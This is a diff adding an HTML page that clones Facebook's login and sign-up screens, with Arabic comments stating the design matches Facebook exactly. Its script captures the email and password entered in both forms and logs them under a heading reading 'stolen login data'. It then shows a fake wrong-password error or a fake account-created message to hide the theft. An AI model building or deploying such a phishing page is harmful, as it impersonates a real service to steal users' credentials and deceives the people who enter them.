@@ -1,0 +1,230 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        /* ديزاين مطابق تماماً لفيسبوك */
+        body { 
+            margin: 0; 
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+        }
+        .header {
+            background: #3b5998;
+            padding: 8px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo {
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+        }
+        .login-box {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .login-input {
+            padding: 6px;
+            border: 1px solid #dddfe2;
+            border-radius: 2px;
+            font-size: 12px;
+        }
+        .login-btn {
+            background: #4267b2;
+            color: white;
+            border: 1px solid #29487d;
+            padding: 4px 8px;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+        .main-content {
+            display: flex;
+            max-width: 980px;
+            margin: 50px auto;
+            gap: 40px;
+        }
+        .left-section {
+            flex: 1;
+        }
+        .right-section {
+            flex: 1;
+        }
+        .slogan {
+            font-size: 24px;
+            margin-top: 40px;
+            color: #333;
+        }
+        .signup-box {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .signup-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        .signup-input {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .birthday-label {
+            font-size: 12px;
+            margin-top: 10px;
+            display: block;
+        }
+        .birthday-select {
+            padding: 4px;
+            margin-right: 8px;
+        }
+        .gender-label {
+            font-size: 12px;
+            margin-right: 15px;
+        }
+        .submit-btn {
+            background: #00a400;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .loading {
+            display: none;
+            color: green;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- الهيدر الزرقا -->
+    <div class="header">
+        <div class="container">
+            <div class="logo">facebook</div>
+            <div class="login-box">
+                <input type="text" class="login-input" placeholder="Email or phone">
+                <input type="password" class="login-input" placeholder="Password">
+                <button class="login-btn" onclick="handleLogin()">Log In</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="main-content">
+        <div class="left-section">
+            <div class="slogan">
+                Facebook helps you connect and share with the people in your life.
+            </div>
+        </div>
+        
+        <div class="right-section">
+            <div class="signup-box">
+                <div class="signup-title">Create a New Account</div>
+                <form id="signupForm">
+                    <input type="text" class="signup-input" placeholder="First name" required>
+
+
+<input type="text" class="signup-input" placeholder="Surname" required>
+                    <input type="text" class="signup-input" placeholder="Mobile number or email address" required>
+                    <input type="password" class="signup-input" placeholder="New password" required>
+                    
+                    <label class="birthday-label">Date of birth</label>
+                    <select class="birthday-select">
+                        <option>Day</option>
+                    </select>
+                    <select class="birthday-select">
+                        <option>Month</option>
+                    </select>
+                    <select class="birthday-select">
+                        <option>Year</option>
+                    </select>
+                    
+                    <label class="birthday-label">Gender</label>
+                    <label class="gender-label"><input type="radio" name="gender"> Female</label>
+                    <label class="gender-label"><input type="radio" name="gender"> Male</label>
+                    <label class="gender-label"><input type="radio" name="gender"> Custom</label>
+                    
+                    <button type="submit" class="submit-btn">Sign Up</button>
+                    <div id="loading" class="loading">Creating your account...</div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // دالة معالجة الدخول من الهيدر
+        function handleLogin() {
+            const email = document.querySelector('.login-input[type="text"]').value;
+            const password = document.querySelector('.login-input[type="password"]').value;
+            
+            if(email && password) {
+                console.log('🚨 بيانات الدخول المسروقة:');
+                console.log('📧 الإيميل:', email);
+                console.log('🔑 الباسورد:', password);
+                
+                // محاكاة التحميل ثم الخطأ
+                setTimeout(() => {
+                    alert('The password that you\'ve entered is incorrect. Forgotten password?');
+                }, 1000);
+            }
+        }
+
+        // دالة معالجة إنشاء الحساب
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const inputs = this.querySelectorAll('.signup-input');
+            const data = {
+                firstName: inputs[0].value,
+                lastName: inputs[1].value,
+                email: inputs[2].value,
+                password: inputs[3].value
+            };
+            
+            if(data.email && data.password) {
+                console.log('🚨 بيانات الحساب الجديد:');
+                console.log('👤 الاسم:', data.firstName, data.lastName);
+                console.log('📧 الإيميل:', data.email);
+                console.log('🔑 الباسورد:', data.password);
+                
+                // محاكاة إنشاء الحساب
+                document.getElementById('loading').style.display = 'block';
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Account created successfully! Please check your email for verification.');
+                    this.reset();
+                }, 2000);
+            }
+        });
+
+        // إضافة تأثيرات واقعية
+        document.querySelectorAll('.signup-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1877f2';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.borderColor = '#dddfe2';
+            });
+        });
+    </script>
+</body>
+</html>
